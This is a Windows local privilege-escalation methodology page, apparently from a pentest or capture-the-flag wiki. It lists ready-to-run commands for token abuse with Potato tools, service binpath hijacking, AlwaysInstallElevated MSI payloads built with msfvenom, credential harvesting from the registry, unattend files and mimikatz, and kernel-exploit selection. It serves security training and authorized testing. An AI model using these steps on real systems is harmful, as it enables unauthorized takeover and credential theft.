---
type: methodology
title: Windows Local Privilege Escalation
tags: [windows, privilege-escalation, methodology]
updated: 2026-07-09
---

# Windows Local Privilege Escalation

> Single-host privilege escalation on a Windows machine: a low-priv or service account → `NT AUTHORITY\SYSTEM` (or → local Administrators). This is the **local** track. Once you own the host, pivot to the domain via [[ad-privesc]]. The [decision tree](#decision-tree) at the bottom bridges the two.

> [!info] Coverage gap
> The ingested boxes so far ([[absolute]], [[active]], [[forest]]) are all **Active Directory** chains, so the local-privesc techniques below are documented from methodology, not yet **observed on** a specific machine. Techniques named in **bold** are hub-page candidates — they get a `techniques/` page on first sighting. AD techniques, by contrast, are already linked hubs.

## 0. Situational awareness (run first)

```cmd
whoami /all          :: identity, groups, and PRIVILEGES — the fastest triage
systeminfo           :: OS build → missing KBs / kernel-exploit candidates
hostname
net localgroup Administrators
net accounts         :: password policy
echo %PATH%          :: world-writable entries → DLL hijacking
```

The output of `whoami /priv` often decides the whole path on the spot (see [§2](#2--token--privilege-abuse-most-common-path)).

## 1. Automated enumeration

| Tool | Use |
|---|---|
| **WinPEAS** | Broad local sweep (`winpeas.exe` / `.bat`). Noisy but complete. |
| **Seatbelt** | `.NET` info-gathering: `Seatbelt.exe -group=all` (cached creds, DPAPI, AppLocker, registry secrets). |
| **PowerUp** | `Invoke-AllChecks` — services, registry, DLL-hijack, AlwaysInstallElevated. |
| **PrivescCheck** | Lighter-weight alternative to WinPEAS. |

## 2. Token / privilege abuse (most common path)

`whoami /priv` privilege → exploit:

| Privilege | Meaning | Path to SYSTEM |
|---|---|---|
| **`SeImpersonate`** / **`SeAssignPrimaryToken`** | Typical of service accounts (IIS, SQL, WinRM, backup) | **Potato family** — `PrintSpoofer`, `GodPotato`, `RoguePotato`, `JuicyPotatoNG` |
| **`SeDebug`** | Inspect/adjust any process | Migrate into a SYSTEM process (meterpreter `migrate`) or process injection |
| **`SeTakeOwnership`** | Take ownership of any object | Own `utilman.exe`/`sethc.exe`, swap for `cmd.exe` |
| **`SeLoadDriver`** | Load kernel drivers | Load a vulnerable driver → kernel SYSTEM |

```cmd
:: SeImpersonate → SYSTEM
PrintSpoofer.exe -i -c "cmd"
GodPotato.exe -cmd "cmd /c whoami"
```

> [!info] Hub candidate
> **SeImpersonate → Potato** is the single most common Windows privesc. A `techniques/seimpersonate-potato.md` page should be created on the first box where it appears. (The tool [[runascs]] is the inverse — local RunAs to *use* creds you already hold.)

## 3. Service misconfiguration

```cmd
:: Unquoted service path (path with a space + a writable parent dir)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows"

:: Services writable by you (look for SERVICE_ALL_ACCESS)
accesschk.exe -uwcqv "Authenticated Users" *

:: If you can reconfigure a high-privileged service, point its binary at your payload:
sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add"
sc stop <svc> & sc start <svc>

:: DLL hijacking: procmon for NAME NOT FOUND lookups in a writable %PATH% dir,
:: then drop a malicious DLL of that name.
```

## 4. Registry

```cmd
:: AlwaysInstallElevated — MSI runs as SYSTEM if BOTH keys = 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: build + run:
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o a.msi
msiexec /quiet /qn /i a.msi

:: AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

:: Service ImagePath / command stubs under HKLM you can overwrite
```

## 5. Scheduled tasks & autoruns

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
:: writable binary that a task runs as SYSTEM?
icacls "C:\Program Files\<app>\<run-as-system.exe>"
```

## 6. Stored credentials

```cmd
cmdkey /list                       :: saved creds → runas /savecred /user:<user> cmd
type C:\Windows\Panther\unattend*.xml   :: plaintext local-admin password
type C:\sysprep\sysprep.xml
:: DPAPI / browser / RDP creds: SharpDPAPI, SharpChrome, mimikatz sekurlsa::logonpasswords
```

## 7. Missing patches → kernel exploits

Feed `systeminfo` to **watson** or **Windows-Exploit-Suggester** → match to known CVEs (e.g. MS16-032, MS16-135, CVE-2021-1675 **PrintNightmare**, CVE-2021-1732). Kernel exploits are a last resort — they can panic the box.

## Decision tree

```
Got a shell. whoami /all → check /priv.
├─ SeImpersonate / SeAssignPrimaryToken  → Potato family → SYSTEM
├─ SeDebug                               → migrate into a SYSTEM process
├─ SeTakeOwnership                       → swap utilman.exe / sethc.exe
├─ (none of the above)                   → local misconfig sweep:
│     services (unquoted path / weak perms / binPath)
│     registry (AlwaysInstallElevated, AutoLogon)
│     scheduled tasks, stored creds (cmdkey /savecred, unattend.xml)
│     missing patches → kernel exploit
│
└─ Now local admin / SYSTEM on the box:
      → is it domain-joined? pivot to [[ad-privesc]]
        (BloodHound, AS-REP roasting, Kerberoasting, ACL abuse, DCSync)
```

## See also
- [[ad-privesc]] — the domain track; where the wiki's ingested chains live.
- Tools: [[runascs]] (local RunAs), [[evil-winrm]] (WinRM session), [[crackmapexec]] (mass exec), [[hashcat]] (cracking).
